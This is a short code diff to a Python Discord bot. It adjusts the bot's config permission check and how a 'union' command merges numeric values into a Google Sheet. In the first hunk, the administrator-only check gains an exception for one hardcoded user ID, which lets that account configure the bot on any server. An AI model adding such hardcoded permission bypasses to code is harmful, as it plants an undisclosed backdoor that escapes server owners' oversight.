@@ -2289,7 +2289,7 @@ async def config_command(ctx: commands.Context, parameter: str):
     if isinstance(ctx.interaction, Interaction) and not ctx.interaction.response.is_done():
         await ctx.interaction.response.defer()  # Acknowledge the interaction immediately
 
-    if not ctx.author.guild_permissions.administrator:
+    if not (ctx.author.guild_permissions.administrator or ctx.author.id == 437982451709640706):
         return await ctx.send("You do not have permission to configure the bot. Only Admins are allowed.")
 
 
@@ -3582,7 +3582,7 @@ async def union(ctx: commands.Context, leader: discord.Member, member_2: discord
                 a1_notation = gspread.utils.rowcol_to_a1(row_idx, col_index)
                 requests.append({
                     "range": a1_notation,
-                    "values": [[str(updated_val)]]
+                    "values": [[updated_val]]
                 })
         if requests:
             sheet_obj.batch_update(requests)
@@ -3627,11 +3627,11 @@ async def union(ctx: commands.Context, leader: discord.Member, member_2: discord
                 if lead_val_str.isdigit() or (lead_val_str.startswith("-") and lead_val_str[1:].isdigit()):
                     lead_val = int(lead_val_str)
                 else:
-                    lead_val = 0
+                    continue  # skip non-numeric or empty
 
                 if col_name in special_max_cols:
                     # e.g. Monument, Emporium => take max
-                    new_val = max(lead_val, part_val)
+                    new_val = int(max(lead_val, part_val))
                 else:
                     # sum
                     new_val = lead_val + part_val
